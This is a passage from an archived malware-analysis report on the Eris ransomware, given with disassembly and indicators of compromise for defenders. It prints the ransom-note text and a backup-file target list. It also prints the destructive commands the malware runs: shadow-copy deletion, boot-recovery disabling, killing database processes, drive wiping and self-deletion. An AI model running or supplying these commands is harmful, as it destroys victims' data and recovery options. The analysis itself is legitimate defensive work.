http://{host}/{id}\\x0d\n\\x0d\n3. Enter your \"ERIS IDENTIFICATION\". (You can find it in below)\\x0d\n\\x0d\n4. Follow the next steps(instructions) displayed on the page for successful\ndecryption.\\x0d\n\\x0d\nNote: \\x0d\nWe only accept payments via Bitcoin (BTC)!\\x0d\n\\x0d\n\\x0d\nERIS IDENTIFICATION:\\x0d\n\\x0d\n{identification}\\x0d\n\\x0d\n\\x0d\n* IF YOU NOT FOLLOW INSTRUCTIONS IN PAYMENT PAGE MORE THAN 7 DAYS!,\\x0d\n YOUR CANNOT ACCESS TO PAYMENT PAGE OR YOUR FILES ANYMORE!\\x0d\n \\x0d\n* IN CASE OF FOLLOWING OUR INSTRUCTION,\\x0d\n FAST AND EASILY EVERYTHING IS BACK TO NORMAL LIKE THAT NEVER HAPPENED!\\x0d\n BUT IF YOU USE OTHER METHODS (THAT NEVER EVER HELPS) YOU JUST DESTROY EVERYTHING\nFOR GOODNESS!\\x0d\n\\x0d\n---------------------------------\\x0d\n* DO NOT MODIFY ENCRYPTED FILE(S)\\x0d\n* DO NOT MOVE ENCRYPTED FILES\\x0d\n* DO NOT USE RECOVERY SOFTWARE(S)\\x0d\n--------------------------------\n### Process enumeration\n\n```\n\n-----\n\n#### The malware enumerates all the running processes:\n```\n0x0053d024 mov ecx, dword [sym.pCreateToolhelp32Snapshot]\n0x0053d02a mov dword [esp], ecx\n0x0053d02d mov dword [var_4h], eax\n0x0053d031 mov dword [var_8h], 2\n0x0053d039 mov dword [var_ch], 2\n0x0053d041 call fcn.syscall___LazyProc_.Call\n0x0053d046 mov eax, dword [var_10h]\n0x0053d04a test eax, eax\n0x0053d04c jb 0x53d326\n0x0053d052 mov dword [var_34h], eax\n0x0053d056 lea eax, sym.type._1_uintptr\n0x0053d05c mov dword [esp], eax\n0x0053d05f call fcn.runtime.newobject\n0x0053d064 mov eax, dword [var_4h]\n0x0053d068 mov ecx, dword [var_34h]\n0x0053d06c mov dword [eax], ecx\n0x0053d06e mov dword [esp], 0x20\n0x0053d075 lea edx, [0x68b3dc]\n0x0053d07b mov dword [var_4h], edx\n0x0053d07f mov edx, dword [sym.pCloseHandle]\n0x0053d085 mov dword [var_8h], edx\n0x0053d089 mov dword [var_ch], eax\n0x0053d08d mov dword [var_10h], 1\n0x0053d095 mov dword [var_14h], 1\n0x0053d09d call fcn.runtime.deferproc\n0x0053d0a2 test eax, eax\n0x0053d0a4 jne 0x53d31c\n0x0053d0aa lea eax, sym.type.Utils.PROCESSENTRY32\n0x0053d0b0 mov dword [esp], eax\n0x0053d0b3 call fcn.runtime.newobject\n0x0053d0b8 mov eax, dword [var_4h]\n0x0053d0bc mov dword [var_48h], eax\n0x0053d0c0 mov dword [eax], 0x22c\n0x0053d0c6 lea ecx, sym.type._2_uintptr\n0x0053d0cc mov dword [esp], ecx\n0x0053d0cf call fcn.runtime.newobject\n0x0053d0d4 mov eax, dword [var_4h]\n0x0053d0d8 mov ecx, dword [var_34h]\n0x0053d0dc mov dword [eax], ecx\n0x0053d0de mov edx, dword [var_48h]\n0x0053d0e2 mov dword [eax + 4], edx\n0x0053d0e5 mov edx, dword [sym.pProcess32FirstW]\n0x0053d0eb mov dword [esp], edx\n0x0053d0ee mov dword [var_4h], eax\n0x0053d0f2 mov dword [var_8h], 2\n0x0053d0fa mov dword [var_ch], 2\n0x0053d102 call fcn.syscall___LazyProc_.Call\n0x0053d107 mov eax, dword [var_10h]\n\n If any of the running processes name contain any of the strings below, it is killed.\n\n sql\n\n```\n\n-----\n\n#### backup malware server http apache agent\n\n Code for killing the processes:\n\n\n-----\n\n```\n0x005fecdc mov ecx, dword [slice_procs]\n0x005fece3 cmp edx, ecx\n0x005fece5 jge 0x5fe90b\n0x005feceb mov dword [var_d4h], edx\n0x005fecf2 lea ecx, [eax + edx*8]\n0x005fecf5 mov ebx, dword [ecx]\n0x005fecf7 mov dword [var_a4h], ebx\n0x005fecfe mov ecx, dword [ecx + 4]\n0x005fed01 mov dword [var_150h], ecx\n0x005fed08 mov ebp, dword [ebx + 0x10]\n0x005fed0b mov dword [esp], ecx\n0x005fed0e call ebp\n0x005fed10 mov eax, dword [var_4h]\n0x005fed14 mov ecx, dword [var_8h]\n0x005fed18 mov dword [esp], eax\n0x005fed1b mov dword [var_4h], ecx\n0x005fed1f mov eax, dword [0x874b38] ; List of strings\n0x005fed25 mov ecx, dword [0x874b3c] ; 7\n0x005fed2b mov edx, dword [0x874b40] ; 7\n0x005fed31 mov dword [var_8h], eax\n0x005fed35 mov dword [var_ch], ecx\n0x005fed39 mov dword [var_10h], edx\n0x005fed3d call fcn.Eris_Utils.Contains\n0x005fed42 movzx eax, byte [var_14h]\n0x005fed47 test al, al\n0x005fed49 je 0x5feccb\n0x005fed4b mov eax, dword [var_a4h]\n0x005fed52 mov eax, dword [eax + 0x18]\n0x005fed55 mov ecx, dword [var_150h]\n0x005fed5c mov dword [esp], ecx\n0x005fed5f call eax\n0x005fed61 nop\n0x005fed62 mov eax, dword [var_4h]\n0x005fed66 mov dword [esp], eax\n0x005fed69 call fcn.os.findProcess\n0x005fed6e mov eax, dword [var_4h]\n0x005fed72 mov ecx, dword [var_8h]\n0x005fed76 test ecx, ecx\n0x005fed78 jne 0x5feccb\n0x005fed7e nop\n0x005fed7f nop\n0x005fed80 nop\n0x005fed81 mov ecx, dword [0x874a48]\n0x005fed87 mov edx, dword [0x874a4c]\n0x005fed8d mov dword [esp], eax\n0x005fed90 mov dword [var_4h], ecx\n0x005fed94 mov dword [var_8h], edx\n0x005fed98 call fcn.os___Process_.signal\n\n### Release of IP address\n\n#### If the username ends with $, the IP address for the machine is released:\n\n```\n\n-----\n\n```\n0x005fe90b lea eax, [0x67505a] ; USERNAME \n0x005fe911 mov dword [esp], eax\n0x005fe914 mov dword [var_4h], 8\n0x005fe91c call fcn.os.Getenv\n0x005fe921 mov eax, dword [var_8h]\n0x005fe925 mov ecx, dword [var_ch]\n0x005fe929 lea edx, [ecx - 1]\n0x005fe92c cmp edx, ecx\n0x005fe92e ja 0x5ff6a5\n0x005fe934 mov dword [username_str], eax\n0x005fe93b sub ecx, edx\n0x005fe93d mov dword [username_str_len], ecx\n0x005fe944 mov ebx, ecx\n0x005fe946 neg ecx\n0x005fe948 sar ecx, 0x1f\n0x005fe94b and edx, ecx\n0x005fe94d mov dword [var_d0h], edx\n0x005fe954 cmp ebx, 1\n0x005fe957 jne 0x5fe966\n0x005fe959 movzx ecx, byte [edx + eax]\n0x005fe95d cmp cl, 0x24 ; \"$\"\n0x005fe960 je 0x5fec2d\n...\n0x005fec2d mov dword [var_190h], 0\n0x005fec38 mov dword [var_194h], 0\n0x005fec43 lea eax, sym.type.string\n0x005fec49 mov dword [var_190h], eax\n0x005fec50 lea ecx, [0x6cecb0] ; \"ipconfig /release\"\n0x005fec56 mov dword [var_194h], ecx\n0x005fec5d lea ecx, [0x674630] ; \"/C %s\"\n0x005fec63 mov dword [esp], ecx\n0x005fec66 mov dword [var_4h], 5\n0x005fec6e lea edx, [var_190h]\n0x005fec75 mov dword [var_8h], edx\n0x005fec79 mov dword [var_ch], 1\n0x005fec81 mov dword [var_10h], 1\n0x005fec89 call fcn.fmt.Sprintf\n0x005fec8e mov eax, dword [var_14h]\n0x005fec92 mov ecx, dword [var_18h]\n0x005fec96 lea edx, [0x674d1b] ; \"cmd.exec\"\n0x005fec9c mov dword [esp], edx\n0x005fec9f mov dword [var_4h], 7\n0x005feca7 mov dword [var_8h], eax\n0x005fecab mov dword [var_ch], ecx\n0x005fecaf call fcn.Eris_Utils.Execute\n0x005fecb4 jmp 0x5fe966\n\n### Encrypting files\n\n#### The malware walks all the disks and encrypts the files. It can perform this process “multithreaded” if a command line flag is given. In this case, it uses one Go routine for each drive. The malware skips any folders containing the following strings:\n\n windows\n\n```\n\n-----\n\n#### windows.old system volume information $recycle.bin program files program files (x86) programdata i386 amd64 sysvol\n\n It also skip the following files:\n\n autoexec.bat boot.ini ntdetect.com msdos.sys io.sys pagefile.sys ntldr config.sys ntuser.dat\n\n If the file has _FLAG_ENCRYPTED_ at the end of the file, it is skipped.\n\n Eris overwrites and deletes backup files with the following file extensions:\n```\n$$$, $db, 001, 001, 002, 003, 113, 73b, __a, __b, ab, aba, abbu, abf, abk, abu, abu1,\nacp, acr, adi, adi, aea, afi, arc, arc, as4, asd, ashbak, asv, asvx, ate, ati, ba6,\nba7, ba8, bac, backup, backupdb, bak, bak, bak, bak, bak, bak2, bak3, bakx, bak~,\nbbb, bbz, bck, bckp, bcm, bdb, bff, bif, bifx, bk1, bk1, bkc, bkf, bkp, bkp, bkup,\nbkz, blend1, blend2, bm3, bmk, bookexport, bpa, bpb, bpm, bpn, bps, bup, bup, caa,\ncbk, cbs, cbu, cenon~, ck9, cmf, crds, csd, csm, da0, dash, dba, dbk, dbk, dim, diy,\ndna, dov, dpb, dsb, dss, fbc, fbf, fbk, fbk, fbu, fbw, fh, fhf, flka, flkb, fpsx,\nftmb, ful, fwbackup, fza, fzb, gb1, gb2, gbp, gho, ghs, gs-bck, ibk, icbu, icf,\ninprogress, ipd, iv2i, j01, jbk, jdc, jpa, jps, kb2, lbf, lcb, llx, mbf, mbk, mbw,\nmdbackup, mddata, mdinfo, mem, mig, mpb, msim, mv_, mynotesbackup, nb7, nba, nbak,\nnbd, nbd, nbf, nbf, nbi, nbk, nbk, nbs, nbu, nco, nda, nfb, nfc, noy, npf, nps,\nnrbak, nrs, nwbak, obk, oeb, old, onepkg, ori, orig, oyx, paq, pba, pbb, pbd, pbf,\npbf, pbj, pbx5script, pbxscript, pdb, pfi, pqb, pqb-backup, prv, psa, ptb, pvc, pvhd,\nqba.tlg, qbb, qbk, qbm, qbmb, qbmd, qbx, qic, qsf, qualsoftcode, quicken2015backup,\nquicken2016backup, quicken2017backup, quickenbackup, qv~, rbc, rbf, rbf, rbf, rbk,\nrbs, rdb, rgmb, rmbak, rrr, safenotebackup, sav, sbb, sbs, sbu, sdc, sim, sis, skb,\nsme, sn1, sn2, sna, sns, spf, spg, spi, sps, sqb, srr, stg, sv$, sv2i, tbk, tdb,\ntibkp, tib, tig, tis, tlg, tmp, tmp, tmr, trn, ttbk, uci, v2i, vbk, vbm, vbox-prev,\nvpcbackup, vrb, w01, walletx, wbb, wbcat, wbk, win, win, wjf, wpb, wspak, wx, xbk,\nxlk, yrcbck, zbfx, ~cw, vib, vkb\n\n```\n\n-----\n\n#### For each file a key is generated using PBKDF2. A random password is used with the salt of\n```\n[0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8] and 1000 iterations. The key is encrypted with the\n\n victim’s public key:\n0x0053fc13 mov ecx, dword [0x87a654] ; rngReader from crypto/rand package\n0x0053fc19 mov edx, dword [0x87a650]\n0x0053fc1f mov dword [esp], edx\n0x0053fc22 mov dword [var_4h], ecx\n0x0053fc26 mov dword [var_8h], eax\n0x0053fc2a mov dword [var_ch], 0x20 ; 32\n0x0053fc32 mov dword [var_10h], 0x20 ; 32\n0x0053fc3a mov dword [var_14h], 0x20 ; 32\n0x0053fc42 call fcn.io.ReadAtLeast\n0x0053fc47 nop\n0x0053fc48 lea eax, sym.type._8_uint8\n0x0053fc4e mov dword [esp], eax\n0x0053fc51 call fcn.runtime.newobject\n0x0053fc56 mov eax, dword [var_4h]\n0x0053fc5a mov ecx, dword [0x6ce388]\n0x0053fc60 mov edx, dword [0x6ce38c]\n0x0053fc66 mov dword [eax], ecx\n0x0053fc68 mov dword [eax + 4], edx\n0x0053fc6b mov ecx, dword [var_12ch]\n0x0053fc72 mov dword [esp], ecx\n0x0053fc75 mov dword [var_4h], 0x20\n0x0053fc7d mov dword [var_8h], 0x20\n0x0053fc85 mov dword [var_ch], eax\n0x0053fc89 mov dword [var_10h], 8\n0x0053fc91 mov dword [var_14h], 8\n0x0053fc99 mov dword [var_18h], 0x3e8 ; 1000\n0x0053fca1 mov dword [var_1ch], 8\n0x0053fca9 lea eax, [0x68ae74]\n0x0053fcaf mov dword [var_20h], eax\n0x0053fcb3 call fcn.golang.org_x_crypto_pbkdf2.Key\n0x0053fcb8 mov eax, dword [var_24h]\n0x0053fcbc mov dword [var_108h], eax\n0x0053fcc3 mov ecx, dword [var_2ch]\n0x0053fcc7 mov dword [var_34h], ecx\n0x0053fccb mov edx, dword [var_28h]\n0x0053fccf mov dword [var_30h], edx\n0x0053fcd3 mov ebx, dword [var_12ch]\n0x0053fcda mov dword [esp], ebx\n0x0053fcdd mov dword [var_4h], 0x20\n0x0053fce5 mov dword [var_8h], 0x20\n0x0053fced mov ebp, dword [arg_13ch]\n0x0053fcf4 mov dword [var_ch], ebp\n0x0053fcf8 mov ebp, dword [arg_140h]\n0x0053fcff mov dword [var_10h], ebp\n0x0053fd03 mov ebp, dword [arg_144h]\n0x0053fd0a mov dword [var_14h], ebp\n0x0053fd0e call fcn.Eris_Cryptography.RSAEncrypt\n\n The file is encrypted with Salsa20 using the generated key for the file.\n\n```\n\n-----\n\n#### === Preventing recovery ===\n\n After encryption of the files, the following commands are executed:\n```\ntaskkill.exe /f /im mysqld.exe\ntaskkill.exe /f /im sqlwriter.exe\ntaskkill.exe /f /im sqlserver.exe\ntaskkill.exe /f /im MSExchange*\ntaskkill.exe /f /im Microsoft.Exchange.*\nvssadmin delete shadows /all /quiet\nwmic shadowcopy delete\nwbadmin delete catalog -quiet\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\n\n Code for executing the commands:\n0x005fe9a6 xor eax, eax\n0x005fe9a8 jmp 0x5fea59\n0x005fe9ad mov dword [var_cch], eax\n0x005fe9b4 lea ecx, [esp + eax*8 + 0x200]\n0x005fe9bb mov edx, dword [ecx]\n0x005fe9bd mov ecx, dword [ecx + 4]\n0x005fe9c0 mov dword [esp], edx\n0x005fe9c3 mov dword [var_4h], ecx\n0x005fe9c7 call fcn.runtime.convTstring\n0x005fe9cc mov eax, dword [var_8h]\n0x005fe9d0 mov dword [var_190h], 0\n0x005fe9db mov dword [var_194h], 0\n0x005fe9e6 lea ecx, sym.type.string\n0x005fe9ec mov dword [var_190h], ecx\n0x005fe9f3 mov dword [var_194h], eax\n0x005fe9fa lea eax, [0x674630] ; \"/C %s\"\n0x005fea00 mov dword [esp], eax\n0x005fea03 mov dword [var_4h], 5\n0x005fea0b lea edx, [var_190h]\n0x005fea12 mov dword [var_8h], edx\n0x005fea16 mov dword [var_ch], 1\n0x005fea1e mov dword [var_10h], 1\n0x005fea26 call fcn.fmt.Sprintf\n0x005fea2b mov eax, dword [var_14h]\n0x005fea2f mov ecx, dword [var_18h]\n0x005fea33 lea edx, [0x674d1b] ; \"cmd.exe\"\n0x005fea39 mov dword [esp], edx\n0x005fea3c mov dword [var_4h], 7\n0x005fea44 mov dword [var_8h], eax\n0x005fea48 mov dword [var_ch], ecx\n0x005fea4c call fcn.Eris_Utils.Execute\n0x005fea51 mov eax, dword [var_cch]\n0x005fea58 inc eax\n0x005fea59 cmp eax, 0xa ; 10\n0x005fea5c jl 0x5fe9ad\n\n```\n\n-----\n\n#### For each drive letter, the malware executes /C cipher /W:%DRIVE_LETTER%: to perform a secure wipe.\n```\n0x005fea62 call fcn.Eris_Utils.GetDrive\n0x005fea67 mov eax, dword [esp]\n0x005fea6a mov dword [var_16ch], eax\n0x005fea71 mov ecx, dword [var_4h]\n0x005fea75 mov dword [var_bch], ecx\n0x005fea7c xor edx, edx\n0x005fea7e jmp 0x5feb54\n0x005fea83 mov dword [var_cch], edx\n0x005fea8a mov dword [esp], ebp\n0x005fea8d mov dword [var_4h], 1\n0x005fea95 call fcn.strings.ToUpper\n0x005fea9a mov eax, dword [var_8h]\n0x005fea9e mov ecx, dword [var_ch]\n0x005feaa2 mov dword [esp], eax\n0x005feaa5 mov dword [var_4h], ecx\n0x005feaa9 call fcn.runtime.convTstring\n0x005feaae mov eax, dword [var_8h]\n0x005feab2 mov dword [var_190h], 0\n0x005feabd mov dword [var_194h], 0\n0x005feac8 lea ecx, sym.type.string\n0x005feace mov dword [var_190h], ecx\n0x005fead5 mov dword [var_194h], eax\n0x005feadc lea eax, [0x6775d1] ; \"/C cipher /W:%s:\"\n0x005feae2 mov dword [esp], eax\n0x005feae5 mov dword [var_4h], 0x10\n0x005feaed lea edx, [var_190h]\n0x005feaf4 mov dword [var_8h], edx\n0x005feaf8 mov dword [var_ch], 1\n0x005feb00 mov dword [var_10h], 1\n0x005feb08 call fcn.fmt.Sprintf\n0x005feb0d mov eax, dword [var_14h]\n0x005feb11 mov ecx, dword [var_18h]\n0x005feb15 lea edx, [0x674d1b] ; \"cmd.exe\"\n0x005feb1b mov dword [esp], edx\n0x005feb1e mov dword [var_4h], 7\n0x005feb26 mov dword [var_8h], eax\n0x005feb2a mov dword [var_ch], ecx\n0x005feb2e call fcn.Eris_Utils.Execute\n\n### Self-removal\n\n#### Finally the malware spawns a new process and exits. The spawned process first pings localhost to create a delay before it deletes the malware’s binary file.\n%WINDIR%\\system32\\cmd.exe /C ping 127.0.0.1 -n 3 > NUL && del /Q /F \"%ERIS_FILE%\"\n\n## IOCs\n\n Pay panel\n\n```\n\n-----\n\n## C2\n\n\n#### epaybfvlutydks6fpfwtwoe2fsph6vve2obgv6qbhyuqwkecbhsf7nyd.onion\n\n d9d120a3.ngrok.io\n\n\n## Hashes\n\n#### 2c7f9fbfd5421406bc88b62a70a570eada14d4a561689125dc8f3ef30e3afc91 33f54f227c26c5abdbe5e0f994082d5b89e1df145deef703948aeb268637d9ba 35fb8b1f9966d7d371cb4d513e3d63655c2357be8ef156850fe8927b13007c9e 48da454be70e5f12c359965cfb55cbe5f272ddc378ae9f08876faf1b510c21b6 99d19dd82330a1c437a64e7ca9896ad9d914de10c4f7aa2222b1a5bc4750f692 d0d6fdd6ce8eccf722c8ee72485ae96c2fe0e2fe9e451c94454f1e8be9d9283b dcdf47ddca1c5f4f9bdd8528bc3e22031fbfd326ad0b4abc11e153bbd79363ec\n\n Download STIX 2 bundle or MISP package here.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-10-06 - Go under the hood- Eris Ransomware.pdf"
    ],
    "report_names": [
        "2019-10-06 - Go under the hood- Eris Ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536039,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653709760,
    "ts_modification_date": 1653709760,
    "files": {
        "pdf": "https://archive.orkl.eu/d5822cc7b5f576693f82633c15472faa569a8ecc.pdf",
        "text": "https://archive.orkl.eu/d5822cc7b5f576693f82633c15472faa569a8ecc.txt",
        "img": "https://archive.orkl.eu/d5822cc7b5f576693f82633c15472faa569a8ecc.jpg"
    }
}